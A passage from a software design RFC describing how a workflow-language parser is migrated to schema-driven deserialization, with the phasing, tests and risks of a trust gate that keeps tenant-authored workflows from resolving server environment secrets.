  `ConfigValue::Secret`), and that path can reach an author-controlled sink (a plugin's
  `baseUrl`/`streamUrl`) just as a provider can. The exfiltration invariant is therefore
  drawn on the right axis — *no author-controlled value may both resolve `$ENV` and reach
  an author-controlled sink*. Control values are const-only **regardless of trust** (`$ENV`
  is never legitimate there — §9.1). The `config:` path is the one place `$ENV` is a real
  operator channel (plugin credentials have no fixed-name fallback), so it is gated by **one
  fail-closed, load-time trust decision** (§9.2): an `Operator`-sourced workflow keeps its
  `config:` secret deferred and resolves it at execution; a `Tenant`-sourced workflow is
  rejected at parse with the same `EnvDisabled` diagnostic, so no secret ever reaches the
  execution layer. Special-casing only the provider block would have left the larger
  `config:` hole open.
- **One resolution path for `config:` secrets at execution — `ConfigValue::resolve` (DONE).**
  A review of this domain found a pre-existing bug: the LLM-callback `expected_bearer`
  (`llm.rs`) cloned the **literal** `Secret` string (`"$ENV.NUDGE_LLM_API_KEY"`) while the
  plugin received the *resolved* value via `resolve_config` and presented *that* as its
  bearer — so legitimate callbacks were rejected, and an attacker who knew the (file-visible)
  var name could authenticate by sending the literal. Resolution is now a single method on
  the type — `ConfigValue::resolve(context)` (with an injectable `resolve_with` for
  parallel-safe testing) — used by plugin-config materialization, the bearer, **and** the
  stream-bridge heartbeat flag (the former literal-`Secret` reader, now consistent). So a
  `$ENV` config field resolves **identically everywhere** — consumer and validator can't
  disagree. Pinned by `config_value_resolve_secret_and_fallback` and the bearer flow.

## 14. Phasing & sequencing

- **A1 — `resolve_type_in_body` (shared body-aware dispatch). DONE.** Implemented as
  `SchemaIndex::resolve_type_in_body` (returns the *resolved* variant target — no
  `FieldTarget` change, §4); the validator's inline union/list arm now calls it via a
  shared `validate_target_instance`, and `validate_ref_instance` delegates to the same.
  Behavior-preserving (107 validator tests).
- **A2 — Union defaulting in the `Defaulter`. DONE.** `recurse_nested` handles list
  fields by inner type and selects the per-item variant via `resolve_type_in_body`; a
  shared `map_named_items` + `default_against` mirror the validator's target dispatch.
  New `union_list_items_get_variant_defaults` test; RFC 0001's defaulting suite intact.
- **A3 — `oneof` discriminator default** (§5). **DONE.** `default_discriminator` on
  `OneOfDecl` (AST, `Option<SpannedValue>`) and `OneOfDef` (`Option<String>`); parser
  accepts `by <disc> = "value"` (string literal required); `find_oneof_errors` rejects
  a default that names no arm; `oneof_body` injects the default when the discriminator
  is omitted (authored value wins); `nml-fmt` round-trips it. 7 tests (parser, extract,
  validation, defaulting, format).
- **A4 — Enum-typed discriminator (DONE) + LSP discriminator-value completion (DONE),
  §7.** Enum-typed discriminator with exhaustiveness checking (`as <enum>`); LSP
  arm-key completion at the discriminator. Variant-field completion landed in
  [RFC 0003](./0003-schema-driven-field-completion.md) as part of general field completion
  (§7b). **Part A is complete.**
- **B1 — Fix + enforce `workflow.model.nml`. DONE.** Syntax fix + parse-every-schema
  guard + well-typed-defaults check (earlier); now a `WORKFLOW_VALIDATOR`, a
  reconciliation test (`workflow_schema_accepts_example_workflows`) validating every
  example workflow recursively, and **load-time enforcement** in `parse_workflow_file`
  (`validate_nml_strict`). The schema is now the enforced source of truth — strict
  validation also catches typo'd/unknown fields the lenient hand parser silently
  dropped (two genuinely-invalid test fixtures were fixed). Verified the parser's
  accepted property keys are a subset of the schema's fields, so enforcement rejects
  nothing the parser meaningfully consumes.
- **B2 — `ValueResolver` const resolution. DONE.** `with_symbols` + a recursive
  `Reference` arm (const → value → recurse, resolving const-wrapped `$ENV` in one pass),
  depth-bounded with a `ReferenceCycle` error. 5 tests incl. parity + cycle bound.
- **B3 — Incremental block migration.** *Started: `prompt` migrated.* `parse_prompt_block`
  (~60 hand-rolled lines) is now `from_body_defaulted(WORKFLOW_VALIDATOR.index(),
  "prompt", …)` with a const-resolving `ValueResolver` (`SymbolTable::resolved_const_snapshot`
  → `with_symbols`, parity with the old `resolve_string`). `PromptConfig`/`OutputFormat`
  gained `Deserialize`; the `outputFormat = "text"` default now comes from the schema
  (single source of truth), and the dead `OutputFormat::from_str` was removed (serde's
  `rename_all = "lowercase"` supersedes it). Drift-guarded
  (`prompt_output_format_default_has_no_drift`). The resolver is **const-only** — a
  `$ENV` reference in a workflow value never reaches the server environment, since
  workflows can be tenant-authored (§9.1 security); pinned by
  `workflow_value_does_not_resolve_env_secret`. Remaining blocks (`provider`, `stage`,
  `pipeline`, `condition`, `route`) follow the same pattern. The `$ENV`
  semantics are settled (§9.1): workflows resolve consts only; server LLM keys arrive via
  the operator-controlled, fixed-name request-time env fallback in the LLM client, which a
  workflow author cannot redirect.
- **B3 — `provider` migrated. DONE.** `parse_provider` (~55 hand-rolled lines of field
  extraction + `ProviderType::from_str` + manual `SecretString` wrapping) is now an
  eight-line `from_body_defaulted(…, "provider", &block.body, ctx.resolver)` plus
  `provider.name = block.name.name` (the name comes from the block header, not the body, via
  `#[serde(skip)]`). `ProviderConfig` gained `Deserialize` (`rename_all = "camelCase"`,
  `type` → `provider_type` via `rename`); `ProviderType` gained `Deserialize`
  (`rename_all = "lowercase"`) and its hand-rolled `from_str` was **removed** (serde is now
  the single source of the enum string mapping). `apiKey` is `Option<SecretString>`
  (`secrecy`'s serde feature): **omitted → `None`** → the LLM client's `resolve_key`
  request-time fallback (the pattern *every* shipped provider already uses); **`$ENV` →
  `EnvDisabled`** at the resolve step (const-only resolver, §9.1) — fail-fast, replacing the
  old parser's silently-useless stored `"$ENV.X"` literal. A raw string literal for the
  `secret`-typed `apiKey` is a schema type-mismatch (the validator wants `$ENV`/reference),
  which correctly steers operators to omission rather than plaintext secrets. The `provider`
  model has no schema *defaults*, so there is nothing to drift-guard; behavior preservation
  is covered by the existing `test_parse_provider` plus the corpus parse guard. 2 tests
  (`$ENV`-apiKey denied + omission → `None`; the repointed `resolve_string` control-field
  guard now uses `agent.workflow`, still hand-parsed).
- **B3 — `pipeline` migrated; `deserialize_block` helper extracted. DONE.** At the second
  named-block migration the shared step was lifted into `deserialize_block<T>(block, model,
  ctx)` — `from_body_defaulted` + the `workflow_block_error` remap under `"<model> '<name>'"`
  — used by both `parse_provider` and `parse_pipeline`; each call site just assigns the
  header name to the returned config. `PipelineConfig` gained `Deserialize` (`name` via
  `#[serde(skip)]`; `transport`/`inbound`/`outbound` via `#[serde(default)]`). `pipeline` is
  fully control-resolvable — `transport` is a stage reference and `inbound`/`outbound` are
  reference lists, which nml-core deserializes as their name strings — so it needs no custom
  logic; `parse_pipeline` (~26 lines) is now 4. Behavior pinned by the existing
  `test_parse_pipeline*` (name-from-header, transport, both reference lists) + the corpus
  guard.
  *Surfaced + closed a latent gap:* schema-deserialized blocks resolve *value* references
  against consts (§9.1), but a pipeline's `inbound`/`transport` are *declaration* (stage)
  references. The hand parser used those names literally; the serde path would const-resolve
  them — so a `const` sharing a stage's name could shadow it. `register_file` already puts
  every declaration (incl. `const`) in one name-keyed map, but the workflow loader never
  enforced uniqueness. It now does: `parse_workflow_file` rejects `symbols.find_duplicates()`,
  so a `const`/`stage` name collision (and any duplicate declaration — two `stage Foo`, which
  the hand parser silently accepted) fails fast at load. This keeps declaration references
  unambiguous and is a strict correctness gain. Verified no shipped workflow has duplicates;
  pinned by `duplicate_declarations_are_rejected`.
- **B4 — `stage` stays hand-written, by design (not laziness).** A `stage` mixes control
  fields (`wasm`) with a `config:` sub-block whose `$ENV` must be **deferred** (§9.2), not
  denied. Those two `$ENV` semantics cannot share `from_body_defaulted`'s whole-body
  const-only resolve (it would deny a legitimate operator `config:` `$ENV` like
  `DeepgramSTT`'s `apiKey`), so `parse_stage` resolves control fields individually and routes
  `config:` through `classify_config_value`. The schema still validates the block at load, so
  it is field assembly over schema-checked input. `deserialize_block`'s doc states this
  constraint so the pattern is not misapplied.
- **B3 — `condition` migrated; named/anonymous deserialize unified. DONE.** The shared step
  was lifted into a core `deserialize_body_as(body, model, context, ctx)`, with two thin
  wrappers: `deserialize_block` (named — error context `"<model> '<name>'"`) and
  `deserialize_body` (anonymous — context is the model name). All four schema-deserialized
  callers now route through it: `provider`/`pipeline` (block) and `prompt`/`condition` (body).
  `Condition` gained `Deserialize` (`field` required, `equals`/`pattern` `#[serde(default)]`);
  `parse_condition` (~20 lines) is now 1, threaded `ctx` through `parse_routes_block` →
  `parse_route`. Pinned by `test_parse_workflow_with_router` (now asserts `when.field`/`equals`/
  `pattern`).
- **B4 — `route` stays hand-written, by design.** A `route`'s `goto` is a **step** reference,
  and steps are *not* top-level declarations — so a `const` sharing a step's name is **not**
  caught by the duplicate enforcement that protects stage/provider references. Const-resolving
  `goto` (which `from_body_defaulted` would do) could therefore silently shadow it, so `goto` is
  read **literally** via `extract`; the route `name` comes from the list-item header; and the
  `when` sub-block — the genuinely serde-able part — goes through the migrated `parse_condition`.
  Pinned by `test_resolve_string_bare_identifier_router_goto` (literal `goto`). This is the same
  declaration-reference principle as B1's duplicate enforcement, applied where enforcement can't
  reach.
- **Declaration-reference consistency: `workflow.entrypoint` is now literal too. DONE.** A
  review of the B4 boundary found `entrypoint` (also a *step* reference) was read via
  `resolve_string` — i.e. **const-resolved** — while `route.goto` was literal: the same
  unprotected shadowing risk, inconsistently handled. `entrypoint` now uses `extract` (literal),
  matching `goto`, so *every* step reference is read literally and none can be shadowed by a
  same-named const. Pinned by `entrypoint_is_literal_not_const_resolved`.
  **All serde-able workflow blocks are migrated**; the remaining hand-written blocks (`stage`,
  `route`, `tool`, `agent`, `step`, `workflow`) are B4 by necessity — each blocked by a concrete
  incompatibility (config-`$ENV` deferral; declaration-reference literals; ACL `|grant` modifier
  syntax that serde cannot see; or field-presence control-flow dispatch) — and each consumes
  schema-validated input.
- **§9.2 — `config:` `$ENV` trust gate. DONE.** `WorkflowSource::{Operator, Tenant}`
  (Copy, no `Default` — fail-closed); a `ParseCtx { symbols, trust }` is built once in
  `parse_workflow_file` and threaded through every `parse_*` (the §9.1 resolver field slots
  in here next with no further signature churn). `parse_config_block` now classifies each
  value via `classify_config_value`, which resolves a const reference one level (fixing the
  former lossy `{:?}` fallback — B4 const-resolution item, landed early since it shares the
  classifier) and **rejects any `$ENV` secret at load for a `Tenant` source** (inline or
  const-wrapped). Operator workflows keep the secret deferred to execution
  (least-secret-exposure unchanged). The execution path (`resolve_config`) is untouched: by
  the load-time gate it only ever sees already-trusted secrets. An unknown (non-const)
  reference in `config:` is the literal name string — parity with `resolve_string` so the
  config and control surfaces agree (§9). A **template string** (`{{args.X | "…"}}`)
  reconstructs to its `{{…}}` source (via `TryFrom<&Value> for String`) so execution-time
  arg substitution still works — the old `{:?}` path stored debug garbage and silently broke
  it (caught by the §9.1 pre-flight parse guard on the real `telnyx-assistant` workflow). 8
  tests (tenant reject, operator defer, const-smuggle reject, const-reference resolves,
  unknown-ref literal parity, template-string reconstruction, args-merge ordering inert, plus
  the corpus parse guard). Production load site (`runner.rs`) passes `Operator` explicitly.
  *Env-with-default fallback — now supported (DONE).* `config: x = $ENV.VAR | "default"`
  parses to `ConfigValue::SecretWithDefault { secret, default }` (operator) and resolves at
  execution to the variable's value, falling back to the literal `default` when it is
  unset/empty; a tenant is rejected (the `$ENV` is gated regardless of the fallback, §9.2).
  The default is classified recursively, so a `$ENV`/nested-fallback default is rejected; any
  non-`$ENV.VAR | literal` fallback shape still fails loud. (Arrays/money remain unsupported —
  no scalar config form.)
- **§9.1 — one const-only resolver per file; `resolve_string` rerouted. DONE.** `ParseCtx`
  gained a `resolver: &ValueResolver` field, built **once** in `parse_workflow_file`
  (`workflow_value_resolver(&symbols)` → `without_env().with_symbols(snapshot)`); the const
  snapshot is taken a single time however many blocks resolve. `resolve_string` is now a thin
  wrapper over it (`extract::<String>(resolver.resolve(value)?)`) — const refs resolve
  (recursively), an unknown ref stays its literal name (`TryFrom<&Value> for String` parity),
  and a control-value `$ENV` is a hard `EnvDisabled` error. `parse_prompt_block` reuses
  `ctx.resolver` instead of rebuilding per call. The reroute is **control-only**;
  `classify_config_value` stays on `ctx.symbols` (config defers `$ENV`, §9.2). Behavior-
  preserving: the new pre-flight guard parses every shipped workflow through the full path and
  passes, proving no control value uses `$ENV` (all `$ENV` lives in `config:`). `symbols`
  remains on `ParseCtx` — config classification needs deferring const-resolution that neither
  resolver mode provides.
  **Actionable `EnvDisabled` diagnostic. DONE.** The accessor lives on the source type —
  `ResolveError::env_disabled_var() -> Option<&str>` — and nml-core's `de::Error` is now an
  enum `{ De(String), Resolve(ResolveError) }` whose `From<ResolveError>` **preserves the
  typed variant** (no eager stringify) and whose `env_disabled_var()` **delegates** to the
  `ResolveError` accessor, so both error types answer identically. `Display` is unchanged —
  every existing stringification is byte-identical, purely additive. One shared
  `env_disabled_message(context, var)` produces the operator guidance ("workflow values
  cannot read environment variables … Provider API keys are supplied automatically when
  `apiKey` is omitted; for other values use a `const`."), used by **every** workflow
  value-resolution path: `resolve_string` (raw `ResolveError`) and the `from_body_defaulted`
  blocks via `workflow_block_error` (`de::Error`). So a denied `$ENV` is diagnosed
  identically whether it appears in `apiKey`, `agent.workflow`, `step.wasm`, or any other
  control field — no path falls back to the bare nml-core wording. Pinned by message
  assertions in both the provider and the `resolve_string` control-field tests. (The
  server-config `from_*_defaulted` callers use an env-enabled resolver and never hit
  `EnvDisabled`, so the guidance is correctly workflow-scoped.)
- **B3 — `artifact` migrated. DONE.** `parse_artifact_block` (~35 lines) is now 1, and the
  hand-rolled `parse_artifact_action` (~45 lines) is **deleted** — `ArtifactStepConfig`/
  `ArtifactActionConfig` gained `Deserialize` (`rename_all = "camelCase"`; `items_ref` →
  `rename = "items"`), and the nested `onCreate`/`onUpdate`/`onDelete` blocks deserialize as
  `ArtifactActionConfig` sub-structs through one `deserialize_body` call. All fields are
  values (no declaration refs), so it is fully control-resolvable. Pinned by the existing
  artifact test (asserts `items_ref`, `on_create.collection`, `on_update.match_by` — i.e. the
  nested struct *and* the `items`/`matchBy` renames).
- **B4 — `resolve_config` fails loud. DONE.** `ToolExecutor::resolve_config` /
  `resolve_config_with_args` now return `Result<String>`; an unset/empty operator `$ENV`
  credential is a **hard, source-naming error** (`tool 'X' config 'key': …`) instead of the
  former `warn!` + silently-empty value that failed opaquely in the plugin. The two
  `unwrap_or_else("{}")`/`unwrap_or_default()` JSON fallbacks were also removed in favor of
  `?`. Callers thread the `Result`; `resolve_config_missing_env_errors` pins the behavior.
  (By the §9.2 load-time gate, only trusted operator secrets ever reach this path.)
- **Cleanups.** `Route.name` tightened from `Option<String>` (always `Some` — routes are
  named list items) to `String`, propagated to the `RouteInfo` admin DTO (wire format was
  already never null). **B5 decommission is effectively complete**: every serde-able block
  (`prompt`, `provider`, `pipeline`, `condition`, `artifact`) is schema-driven with its
  hand-rolled defaults/extraction removed; the remaining hand-written blocks (`stage`,
  `route`, `tool`, `agent`, `step`, `workflow`) are B4 by necessity (config-`$ENV` deferral,
  declaration references, ACL modifier syntax, or control-flow assembly), each documented.

The validator rewrite RFC 0001 gated to "Phase 5" is **no longer needed** — A1 replaces
it with a ~40-line dispatch extraction (§4). B1 is the highest-value, lowest-risk item
and should land first regardless of Part A.

## 15. Testing strategy

- Shared dispatch (A1): validation output **byte-identical** to pre-change across the
  validator suite; `resolve_type_in_body` returns the same target the inline arm chose.
- `oneof` default: absent discriminator → injected; default naming no arm → schema error;
  present discriminator still wins.
- Union defaulting: selected-variant defaults injected; bounds (budget/depth) hold; a
  hostile union schema degrades gracefully.
- Enum-typed discriminator: arm-key/enum-variant coverage mismatch reported.
- LSP: discriminator-value completion inside a `oneof` block. (Variant-field completion is
  deferred to a future general model-field-completion feature, §7b — not tested here.)
- `ValueResolver` const resolution: const lookup, chained refs, const-wrapped `$ENV`
  (`const base = $ENV.B`) resolving in one pass, cycle rejection, and **unknown-ref →
  literal-string parity** with `resolve_string` (not an error — §9).
- Workflow B1: `workflow.model.nml` parses and is well-typed (the guard that would have
  caught `provider?`) — **done**; every shipped workflow validates clean
  (`workflow_schema_accepts_example_workflows`) and parses through the full path
  (`example_workflows_parse_with_const_only_control_resolver`) — **done**.
- Workflow B3: drift test per migrated block (schema default == removed serde default);
  end-to-end workflow execution unchanged.
- Workflow security boundary (§9.1/§9.2): (a) **pre-flight parity** — no example workflow
  uses `$ENV` in a control value, so rerouting `resolve_string` through `without_env()` is
  behavior-preserving (freezes the invariant before the reroute); (b) a `provider`/control
  value with `$ENV` fails `EnvDisabled` regardless of trust, a const still resolves, and a
  const cannot smuggle `$ENV` (`const c = $ENV.X` → `EnvDisabled`); (c) **config trust gate
  at load** — a `Tenant`-sourced workflow with a `config:` `$ENV` (inline *or* via a const)
  is rejected at parse with `EnvDisabled`, so its parsed model holds no secret; an
  `Operator`-sourced one keeps the secret deferred and resolves it at execution (the
  operator examples); (d) **fail-closed** — a load site that omits the trust argument gets
  `Tenant` behavior (no `Default`).
- args-merge ordering (§9.2): an LLM arg whose value is the literal `"$ENV.SECRET"` is
  substituted verbatim and **never** environment-resolved (resolve-then-substitute ordering
  in `resolve_config_with_args`).
- `resolve_config` fail-loud: a trusted `config:` `$ENV` naming an unset variable produces a
  hard, source-naming error — not a silent empty string.
- `config:` const resolution (B4): `config: x = someConst` resolves to the const's value
  (regression for the former `{:?}` debug-string fallback); `config: x = secretConst` (where
  `const secretConst = $ENV.X`) classifies as a deferred secret, not a literal.

## 16. Risks

- **Validator union-arm change (A1)** — low blast radius now (a ~40-line dispatch
  extraction, not a rewrite — the key revision over RFC 0001's plan, §4); behavior-
  preserving and guarded by the full validator suite.
- **Workflow migration scope** — large parser; mitigated by the layered B1–B5 strategy
  where each layer is shippable and B1 (enforcement) delivers value with zero parser
  change.
- **Const-resolution semantics** — `ValueResolver`'s `Reference` arm must match the
  hand-parser's `resolve_string` exactly (unknown-ref → literal, cycle rejection,
  const-wrapped `$ENV`); pinned by parity tests against current behavior before any
  block migrates.
- **Hidden parser/schema divergence** — B1's reconciliation may surface fields the
  schema claims but the parser ignores (or vice versa); treated as bugs to reconcile,
  not silently preserved.
- **Two-path secret resolution (§9.2)** — `$ENV` resolves on two distinct paths (control
  values via `ValueResolver` at load; `config:` blocks via the plugin host at execution).
  The risk is securing one and forgetting the other, which yields a *false* guarantee.
  Mitigated by drawing the invariant on the value-reaches-sink axis: the control path is
  const-only always (no `$ENV`, no flag), and the `config:` path is gated by one fail-closed
  trust flag **at load** (untrusted ⇒ rejected at parse, so no secret reaches execution),
  with the args-merge ordering and the untrusted-`config:` denial explicitly tested (§15) so
  neither path can regress silently.
